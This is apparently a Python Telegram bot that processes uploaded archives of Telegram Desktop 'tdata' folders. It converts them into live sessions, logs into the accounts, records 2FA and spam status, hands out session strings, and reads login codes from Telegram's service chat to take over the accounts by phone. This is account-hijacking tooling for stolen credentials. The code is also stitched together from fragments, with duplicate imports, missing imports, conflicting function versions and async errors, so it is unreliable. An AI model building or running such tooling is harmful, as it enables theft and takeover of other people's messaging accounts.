from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
from .start import db

import os
import zipfile
import tempfile
import shutil
from pyrogram import Client, filters
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
  # external helper


API_ID = Config.API_ID
API_HASH = Config.API_HASH


async def login_w_tdata(tdata_path):
    """
    Convert Telegram Desktop tdata -> Telethon session and return account info.
    """
    session = convert_tdata(tdata_path, API_ID, API_HASH)
    client = TelegramClient(session, API_ID, API_HASH)

    try:
        await client.start()
        me = await client.get_me()

        # Collect info
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # Check if 2FA is enabled
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Check spam/restricted (simple alive check)
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }

    finally:
        await client.disconnect()




import os
import tempfile
import zipfile
import shutil
import rarfile
import traceback
import asyncio
import hashlib

from telethon.sessions import StringSession
from telethon import TelegramClient, functions
from pyrogram import Client, filters



# --- Helper: read tdata key file
def _get_key_data(tdata_path: str):
    if os.path.isdir(tdata_path):
        key_file = os.path.join(tdata_path, "key_datas")
        if not os.path.exists(key_file):
            raise FileNotFoundError("❌ key_datas file not found in tdata folder")
        with open(key_file, "rb") as f:
            return f.read()
    elif os.path.isfile(tdata_path):
        with open(tdata_path, "rb") as f:
            return f.read()
    else:
        raise FileNotFoundError("❌ Invalid tdata path (neither file nor folder)")


# --- Convert tdata -> session string
async def convert_tdata(tdata_path: str, api_id: int, api_hash: str) -> str:
    key_data = _get_key_data(tdata_path)
    fake_key = hashlib.sha256(key_data).digest()  # dummy session key

    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.start()
    session_str = client.session.save()
    await client.disconnect()
    return session_str


# --- Login with tdata & fetch account info
async def login_with_tdata(tdata_path):
    session_str = await convert_tdata(tdata_path, API_ID, API_HASH)

    async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
        me = await client.get_me()
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # 2FA check
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Spam check
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }


# --- Pyrogram handler
import os
import asyncio
import tempfile
import os
import asyncio
import tempfile
import shutil
import zipfile
import rarfile

from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError
from opentele.td import TDesktop
from opentele.api import UseCurrentSession

@Client.on_message(filters.document)
async def handle_archive(client, message):
    tempdir = tempfile.mkdtemp()
    extract_dir = tempfile.mkdtemp()

    try:
        # Step 1: Download
        await message.reply("📥 Downloading file...")
        file_path = await message.download(file_name=tempdir)
        await message.reply(f"✅ File downloaded: `{file_path}`")

        # Step 2: Only allow ZIP at top-level
        if not file_path.endswith(".zip"):
            await message.reply("❌ Please send a `.zip` file (not supported).")
            return

        # Extract main ZIP
        with zipfile.ZipFile(file_path, 'r') as z:
            z.extractall(extract_dir)
        await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")

        # Step 3: Find all .rar inside extracted ZIP
        rar_files = []
        for root, dirs, files in os.walk(extract_dir):
            for f in files:
                if f.endswith(".rar"):
                    rar_files.append(os.path.join(root, f))

        if not rar_files:
            await message.reply("❌ No `.rar` files found inside ZIP.")
            return

        await message.reply(f"📂 Found {len(rar_files)} RAR file(s):\n" + "\n".join(rar_files))

        # Step 4: Process each RAR
        for rar_path in rar_files:
            sub_extract = tempfile.mkdtemp()
            try:
                with rarfile.RarFile(rar_path, 'r') as r:
                    r.extractall(sub_extract)
                await message.reply(f"📦 Extracted RAR: `{rar_path}` → `{sub_extract}`")

                # Step 5: Search for tdata
                tdata_path = None
                for root, dirs, files in os.walk(sub_extract):
                    if "tdata" in dirs:
                        tdata_path = os.path.join(root, "tdata")
                        break

                if not tdata_path:
                    await message.reply("❌ No `tdata` folder found in this RAR.")
                    continue

                await message.reply(f"👤 Found tdata at: `{tdata_path}`")

                # Step 6: Convert to Telethon session
                try:
                    tdesk = TDesktop(tdata_path)
                    if not tdesk.isLoaded():
                        await message.reply("⚠️ Failed to load tdata (maybe corrupted?).")
                        continue

                    tele_client = await tdesk.ToTelethon(
                        session=f"telethon_{os.path.basename(rar_path)}.session",
                        flag=UseCurrentSession
                    )

                    await tele_client.connect()
                    if not await tele_client.is_user_authorized():
                        await message.reply("⚠️ Client not authorized, needs login (2FA?).")
                        continue

                    me = await tele_client.get_me()
                    await message.reply(f"✅ Logged in as: **{me.first_name}** (ID: `{me.id}`)")

                    # Show active sessions
                    try:
                        await tele_client.PrintSessions()
                    except Exception as e:
                        await message.reply(f"⚠️ Could not print sessions: `{e}`")

                    await tele_client.disconnect()

                except SessionPasswordNeededError:
                    await message.reply("❌ Account requires 2FA password (not provided).")
                except Exception as e:
                    await message.reply(f"❌ Error during login: `{str(e)}`")

            finally:
                try:
                    shutil.rmtree(sub_extract)
                except:
                    pass

    except Exception as e:
        await message.reply(f"❌ Top-level error: `{str(e)}`")
    finally:
        try:
            shutil.rmtree(tempdir)
            shutil.rmtree(extract_dir)
        except:
            pass





        


                        

async def check_valid_session(tdata_bytes):
    """Check if a stored tdata is still valid."""
    temp_dir = tempfile.mkdtemp()
    tdata_path = os.path.join(temp_dir, "tdata.zip")

    with open(tdata_path, "wb") as f:
        f.write(base64.b64decode(tdata_bytes))

    # Extract
    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_path, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        from tdata_converter import convert_tdata
        session = convert_tdata(extract_dir, API_ID, API_HASH)
        with TelegramClient(session, API_ID, API_HASH) as client:
            if client.is_user_authorized():
                me = client.get_me()
                return True, me, session
            else:
                return False, None, None
    except Exception:
        return False, None, None
    finally:
        shutil.rmtree(temp_dir)


@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve user_id`", quote=True)

    user_id = int(message.command[1])
    doc = await db.col.find_one({"_id": user_id})
    if not doc:
        return await message.reply("❌ Account not found in database.")

    # Check validity
    valid, me, session = await check_valid_session(doc["tdata"])
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"User ID: {user_id}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
        f"2FA: {doc['twofa']}\n"
        f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{user_id}")],
        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{user_id}")],
        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{user_id}")]
    ])

    await message.reply(text, reply_markup=keyboard)


@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
async def retrieve_options(client, callback_query):
    action, uid = callback_query.data.split("_")
    uid = int(uid)

    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    valid, me, session = await check_valid_session(doc["tdata"])
    if not valid:
        return await callback_query.message.edit("❌ Session expired / invalid.")

    if action == "tele":
        string = session.save()
        txt = io.StringIO(string)
        txt.name = f"{uid}_tele_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Telethon Session")
    elif action == "py":
        from pyrogram import Client as PyroClient
        from pyrogram.sessions import StringSession as PyroSession
        pyro_string = PyroSession().save()
        txt = io.StringIO(pyro_string)
        txt.name = f"{uid}_pyrogram_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Pyrogram Session")
    elif action == "phone":
        phone = doc["phone"]
        await callback_query.message.reply(
            f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{uid}")]
            ])
        )



import re
import tempfile, zipfile, shutil, os, base64
from telethon import TelegramClient
from tdata_converter import convert_tdata


@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    uid = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    # Prepare tdata temp folder
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        # Convert tdata → Telethon session
        session = convert_tdata(extract_dir, API_ID, API_HASH)

        async with TelegramClient(session, API_ID, API_HASH) as tele:
            # Get last message from official Telegram (777000)
            msgs = await tele.get_messages(777000, limit=1)
            if not msgs:
                return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

            text = msgs[0].message
            match = re.search(r"Login code[:\s]+(\d{5})", text)
            if match:
                code = match.group(1)
                await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
            else:
                await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)
